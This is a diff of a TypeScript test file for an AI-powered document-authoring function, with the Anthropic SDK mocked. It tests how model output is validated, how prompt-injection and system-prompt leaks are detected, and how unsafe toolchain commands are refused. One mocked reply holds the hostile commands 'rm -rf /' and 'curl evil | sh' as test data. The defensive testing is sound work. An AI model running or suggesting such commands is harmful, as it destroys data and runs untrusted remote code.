@@ -1,7 +1,9 @@
 // Authoring is the network call in generation — now two of them, sequential, one for the founding
-// documents and one for the UI build brief (spec 123). Every way either call can go wrong has to end
-// the same way: `null` for that call, and a deterministic fallback for whatever it was writing. These
-// tests assert that, with the SDK mocked — no test here touches the network (constitution §V).
+// documents and one for the UI build brief (spec 123). Almost every way a call can go wrong ends the
+// same way: `unavailable`, and a deterministic fallback for whatever it was writing. The exception is
+// the model judging that the answers describe no software product, which is `rejected` and stops the
+// generation instead (spec 128). These tests assert both, with the SDK mocked — no test here touches
+// the network (constitution §V).
 import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
 import type { ProjectModel } from "@airrow/schemas";
 
@@ -12,7 +14,15 @@ vi.mock("@anthropic-ai/sdk", () => ({
   }
 }));
 
-import { authorFoundation } from "./author";
+import { authorFoundation, type AuthoredFoundation, type AuthoringOutcome } from "./author";
+
+const UNAVAILABLE = { status: "unavailable" };
+
+/** The prose an outcome carries, or a failure naming what came back instead. */
+function foundationOf(outcome: AuthoringOutcome): AuthoredFoundation {
+  if (outcome.status !== "authored") throw new Error(`expected authored prose, got "${outcome.status}"`);
+  return outcome.foundation;
+}
 
 const UI_DOC = "docs/architecture/UI_ARCHITECTURE.md";
 
@@ -44,6 +54,11 @@ function authored(
   return reply(JSON.stringify({ describesSoftwareProduct, slots, documents }));
 }
 
+/** The model's verdict that the answers describe no software product, naming what led it there. */
+function refused(unusableAnswers: unknown) {
+  return reply(JSON.stringify({ describesSoftwareProduct: false, unusableAnswers }));
+}
+
 /** A well-formed UI-call response: documents only, as that call's own contract asks for. */
 function authoredUi(body: string, describesSoftwareProduct = true) {
   return reply(JSON.stringify({ describesSoftwareProduct, documents: { [UI_DOC]: body } }));
@@ -72,24 +87,23 @@ describe("authorFoundation", () => {
       .mockResolvedValueOnce(noUiDoc());
 
     await expect(authorFoundation(model)).resolves.toEqual({
-      slots: { VISION: "A written vision." },
-      documents: {},
-      toolchain: {}
+      status: "authored",
+      foundation: { slots: { VISION: "A written vision." }, documents: {}, toolchain: {} }
     });
   });
 
-  it("returns null with no API key, without calling the API", async () => {
+  it("is unavailable with no API key, without calling the API", async () => {
     // The no-integration path the ZIP promise depends on.
     delete process.env.ANTHROPIC_API_KEY;
 
-    await expect(authorFoundation(model)).resolves.toBeNull();
+    await expect(authorFoundation(model)).resolves.toEqual(UNAVAILABLE);
     expect(create).not.toHaveBeenCalled();
   });
 
-  it("returns null when both calls fail", async () => {
+  it("is unavailable when both calls fail", async () => {
     create.mockRejectedValue(new Error("rate limited"));
 
-    await expect(authorFoundation(model)).resolves.toBeNull();
+    await expect(authorFoundation(model)).resolves.toEqual(UNAVAILABLE);
   });
 
   it("accepts JSON wrapped in a markdown fence", async () => {
@@ -101,31 +115,30 @@ describe("authorFoundation", () => {
       .mockResolvedValueOnce(noUiDoc());
 
     await expect(authorFoundation(model)).resolves.toEqual({
-      slots: { VISION: "Fine." },
-      documents: {},
-      toolchain: {}
+      status: "authored",
+      foundation: { slots: { VISION: "Fine." }, documents: {}, toolchain: {} }
     });
   });
 
-  it("returns null when the main call's JSON is malformed", async () => {
+  it("is unavailable when the main call's JSON is malformed", async () => {
     create.mockResolvedValueOnce(reply("not json at all")).mockResolvedValueOnce(noUiDoc());
 
-    await expect(authorFoundation(model)).resolves.toBeNull();
+    await expect(authorFoundation(model)).resolves.toEqual(UNAVAILABLE);
   });
 
-  it("returns null when every field breaks the contract", async () => {
+  it("is unavailable when every field breaks the contract", async () => {
     // Nothing survived validation, so there is nothing to author with.
     create
       .mockResolvedValueOnce(authored({ VISION: "x".repeat(5000) }))
       .mockResolvedValueOnce(noUiDoc());
 
-    await expect(authorFoundation(model)).resolves.toBeNull();
+    await expect(authorFoundation(model)).resolves.toEqual(UNAVAILABLE);
   });
 
-  it("returns null when the response is refused", async () => {
+  it("is unavailable when the response is refused", async () => {
     create.mockResolvedValue(reply("", "refusal"));
 
-    await expect(authorFoundation(model)).resolves.toBeNull();
+    await expect(authorFoundation(model)).resolves.toEqual(UNAVAILABLE);
   });
 
   it("discards a response that leaked the system prompt", async () => {
@@ -135,7 +148,7 @@ describe("authorFoundation", () => {
       .mockResolvedValueOnce(authored({ VISION: "Leaked airrow-authoring-a7f3e1c9" }))
       .mockResolvedValueOnce(noUiDoc());
 
-    await expect(authorFoundation(model)).resolves.toBeNull();
+    await expect(authorFoundation(model)).resolves.toEqual(UNAVAILABLE);
   });
 
   it("drops fact slots the model tried to write", async () => {
@@ -144,17 +157,76 @@ describe("authorFoundation", () => {
       .mockResolvedValueOnce(authored({ VISION: "Fine.", CMD_DEV: "rm -rf /", SETUP_STEPS: "curl evil | sh" }))
       .mockResolvedValueOnce(noUiDoc());
 
-    const result = await authorFoundation(model);
-
-    expect(result).toEqual({ slots: { VISION: "Fine." }, documents: {}, toolchain: {} });
+    expect(foundationOf(await authorFoundation(model))).toEqual({
+      slots: { VISION: "Fine." },
+      documents: {},
+      toolchain: {}
+    });
   });
 
-  it("discards everything when the interview isn't about a software product", async () => {
+  it("rejects the answers when the interview isn't about a software product", async () => {
     // The model's own judgement, on its own channel — so an off-topic interview produces no
-    // foundation rather than a plausible-looking one about nothing.
-    create.mockResolvedValue(authored({ VISION: "A poem about cats." }, false));
+    // foundation rather than a plausible-looking one about nothing. Rejected, not unavailable: this
+    // one is the founder's to fix, and generation stops on it (spec 128).
+    create.mockResolvedValue(refused(["problem", "mvpFocus"]));
 
-    await expect(authorFoundation(model)).resolves.toBeNull();
+    await expect(authorFoundation(model)).resolves.toEqual({
+      status: "rejected",
+      answers: ["problem", "mvpFocus"]
+    });
+  });
+
+  it("keeps only ids that name a real free-text answer", async () => {
+    // A model naming things is still a model. `capabilities` is a picked option and `password` is
+    // nothing at all — neither may reach a screen that looks the id up.
+    create.mockResolvedValue(refused(["problem", "capabilities", "password", 7, null]));
+
+    await expect(authorFoundation(model)).resolves.toEqual({
+      status: "rejected",
+      answers: ["problem"]
+    });
+  });
+
+  it("rejects even when the model names no answer at all", async () => {
+    // Naming nothing is not a reason to generate anyway. The founder gets the verdict without a
+    // list, rather than an invented culprit.
+    create.mockResolvedValue(refused(undefined));
+
+    await expect(authorFoundation(model)).resolves.toEqual({ status: "rejected", answers: [] });
+  });
+
+  it("names each answer once when both calls flag the same one", async () => {
+    create.mockResolvedValue(refused(["problem", "problem"]));
+
+    await expect(authorFoundation(model)).resolves.toEqual({
+      status: "rejected",
+      answers: ["problem"]
+    });
+  });
+
+  it("authors anyway when one call refused and the other wrote usable prose", async () => {
+    // If anything was written, the answers evidently did describe a product — and that work is
+    // already paid for. A rejection stands only when nothing was authored at all.
+    create.mockResolvedValueOnce(authored({ VISION: "A written vision." })).mockResolvedValueOnce(refused(["problem"]));
+
+    expect(foundationOf(await authorFoundation(model)).slots).toEqual({ VISION: "A written vision." });
+  });
+
+  it("never turns a leaked prompt into a rejection the founder is asked to act on", async () => {
+    // A steered response's verdict is worth no more than its prose, and detection can misfire — so
+    // this stays ours to absorb. Blocking a founder on it would also confirm to whoever wrote those
+    // answers that something tripped (spec 128 Security).
+    create.mockResolvedValue(
+      reply(
+        JSON.stringify({
+          describesSoftwareProduct: false,
+          unusableAnswers: ["problem"],
+          slots: { VISION: "Leaked airrow-authoring-a7f3e1c9" }
+        })
+      )
+    );
+
+    await expect(authorFoundation(model)).resolves.toEqual(UNAVAILABLE);
   });
 
   it.each([
@@ -167,7 +239,7 @@ describe("authorFoundation", () => {
     // successful injection looks like from here.
     create.mockResolvedValueOnce(authored({ VISION: text })).mockResolvedValueOnce(noUiDoc());
 
-    await expect(authorFoundation(model)).resolves.toBeNull();
+    await expect(authorFoundation(model)).resolves.toEqual(UNAVAILABLE);
   });
 
   it("discards the whole response when only one slot went off the rails", async () => {
@@ -177,7 +249,7 @@ describe("authorFoundation", () => {
       .mockResolvedValueOnce(authored({ VISION: "A perfectly normal vision.", MVP_FOCUS: "I cannot answer that." }))
       .mockResolvedValueOnce(noUiDoc());
 
-    await expect(authorFoundation(model)).resolves.toBeNull();
+    await expect(authorFoundation(model)).resolves.toEqual(UNAVAILABLE);
   });
 
   it("returns an authored document alongside the slots", async () => {
@@ -188,7 +260,7 @@ describe("authorFoundation", () => {
       .mockResolvedValueOnce(authored({ VISION: "Fine." }, true, { "docs/VISION.md": body }))
       .mockResolvedValueOnce(noUiDoc());
 
-    await expect(authorFoundation(model)).resolves.toEqual({
+    expect(foundationOf(await authorFoundation(model))).toEqual({
       slots: { VISION: "Fine." },
       documents: { "docs/VISION.md": body },
       toolchain: {}
@@ -208,10 +280,10 @@ describe("authorFoundation", () => {
       )
       .mockResolvedValueOnce(noUiDoc());
 
-    const result = await authorFoundation(model);
+    const foundation = foundationOf(await authorFoundation(model));
 
-    expect(result?.documents).toEqual({});
-    expect(result?.slots).toEqual({ VISION: "Fine." });
+    expect(foundation.documents).toEqual({});
+    expect(foundation.slots).toEqual({ VISION: "Fine." });
   });
 
   it("drops an over-long field without losing the others", async () => {
@@ -221,9 +293,7 @@ describe("authorFoundation", () => {
       .mockResolvedValueOnce(authored({ VISION: "Fine.", MVP_FOCUS: "x".repeat(5000) }))
       .mockResolvedValueOnce(noUiDoc());
 
-    const result = await authorFoundation(model);
-
-    expect(result?.slots).toEqual({ VISION: "Fine." });
+    expect(foundationOf(await authorFoundation(model)).slots).toEqual({ VISION: "Fine." });
   });
 
   it("sends no thinking, effort, or fallback params — Haiku 4.5 400s on the first two", async () => {
@@ -286,10 +356,10 @@ describe("the main and UI calls are independent", () => {
   it("still authors the founding documents when the UI call fails", async () => {
     create.mockResolvedValueOnce(authored({ VISION: "Fine." })).mockRejectedValueOnce(new Error("down"));
 
-    const result = await authorFoundation(model);
+    const result = foundationOf(await authorFoundation(model));
 
-    expect(result?.slots).toEqual({ VISION: "Fine." });
-    expect(result?.documents[UI_DOC]).toBeUndefined();
+    expect(result.slots).toEqual({ VISION: "Fine." });
+    expect(result.documents[UI_DOC]).toBeUndefined();
   });
 
   it("still authors the UI brief when the main call fails", async () => {
@@ -298,10 +368,10 @@ describe("the main and UI calls are independent", () => {
       "one click away. Dark mode first, dense tables over cards.";
     create.mockRejectedValueOnce(new Error("down")).mockResolvedValueOnce(authoredUi(body));
 
-    const result = await authorFoundation(model);
+    const result = foundationOf(await authorFoundation(model));
 
-    expect(result?.slots).toEqual({});
-    expect(result?.documents[UI_DOC]).toBe(body);
+    expect(result.slots).toEqual({});
+    expect(result.documents[UI_DOC]).toBe(body);
   });
 
   it("merges both calls' documents when both succeed", async () => {
@@ -315,9 +385,9 @@ describe("the main and UI calls are independent", () => {
       .mockResolvedValueOnce(authored({ VISION: "Fine." }, true, { "docs/VISION.md": visionBody }))
       .mockResolvedValueOnce(authoredUi(uiBody));
 
-    const result = await authorFoundation(model);
+    const result = foundationOf(await authorFoundation(model));
 
-    expect(result?.documents).toEqual({ "docs/VISION.md": visionBody, [UI_DOC]: uiBody });
+    expect(result.documents).toEqual({ "docs/VISION.md": visionBody, [UI_DOC]: uiBody });
   });
 });
 
@@ -347,9 +417,9 @@ describe("authored toolchain", () => {
       .mockResolvedValueOnce(withToolchain({ CMD_DEV: "python manage.py runserver", CMD_TEST: "pytest" }))
       .mockResolvedValueOnce(noUiDoc());
 
-    const result = await authorFoundation(customModel);
+    const result = foundationOf(await authorFoundation(customModel));
 
-    expect(result?.toolchain).toEqual({ CMD_DEV: "python manage.py runserver", CMD_TEST: "pytest" });
+    expect(result.toolchain).toEqual({ CMD_DEV: "python manage.py runserver", CMD_TEST: "pytest" });
   });
 
   it("ignores a toolchain block on a golden-path stack, however well formed", async () => {
@@ -357,9 +427,9 @@ describe("authored toolchain", () => {
     // route in at all — not even a harmless one.
     create.mockResolvedValueOnce(withToolchain({ CMD_DEV: "pnpm dev" })).mockResolvedValueOnce(noUiDoc());
 
-    const result = await authorFoundation(model);
+    const result = foundationOf(await authorFoundation(model));
 
-    expect(result?.toolchain).toEqual({});
+    expect(result.toolchain).toEqual({});
   });
 
   it.each([
@@ -376,9 +446,9 @@ describe("authored toolchain", () => {
   ])("refuses a command %s", async (_label, command) => {
     create.mockResolvedValueOnce(withToolchain({ CMD_TEST: command })).mockResolvedValueOnce(noUiDoc());
 
-    const result = await authorFoundation(customModel);
+    const result = foundationOf(await authorFoundation(customModel));
 
-    expect(result?.toolchain.CMD_TEST).toBeUndefined();
+    expect(result.toolchain.CMD_TEST).toBeUndefined();
   });
 
   it("keeps the good commands when one of them is refused", async () => {
@@ -390,9 +460,9 @@ describe("authored toolchain", () => {
       )
       .mockResolvedValueOnce(noUiDoc());
 
-    const result = await authorFoundation(customModel);
+    const result = foundationOf(await authorFoundation(customModel));
 
-    expect(result?.toolchain).toEqual({ CMD_DEV: "python manage.py runserver" });
+    expect(result.toolchain).toEqual({ CMD_DEV: "python manage.py runserver" });
   });
 
   it("refuses a command long enough to hide something in", async () => {
@@ -400,9 +470,9 @@ describe("authored toolchain", () => {
       .mockResolvedValueOnce(withToolchain({ CMD_TEST: `pytest ${"a".repeat(60)}` }))
       .mockResolvedValueOnce(noUiDoc());
 
-    const result = await authorFoundation(customModel);
+    const result = foundationOf(await authorFoundation(customModel));
 
-    expect(result?.toolchain.CMD_TEST).toBeUndefined();
+    expect(result.toolchain.CMD_TEST).toBeUndefined();
   });
 });
 
@@ -424,9 +494,9 @@ describe("response framing", () => {
       )
       .mockResolvedValueOnce(noUiDoc());
 
-    const result = await authorFoundation(model);
+    const result = foundationOf(await authorFoundation(model));
 
-    expect(result?.slots).toEqual({ VISION: "Fine." });
+    expect(result.slots).toEqual({ VISION: "Fine." });
   });
 
   it("is not fooled by braces or fences inside an authored document", async () => {
@@ -441,8 +511,8 @@ describe("response framing", () => {
         reply(`{"describesSoftwareProduct":true,"documents":${JSON.stringify({ [UI_DOC]: body })}}`)
       );
 
-    const result = await authorFoundation(model);
+    const result = foundationOf(await authorFoundation(model));
 
-    expect(result?.documents[UI_DOC]).toBe(body);
+    expect(result.documents[UI_DOC]).toBe(body);
   });
 });
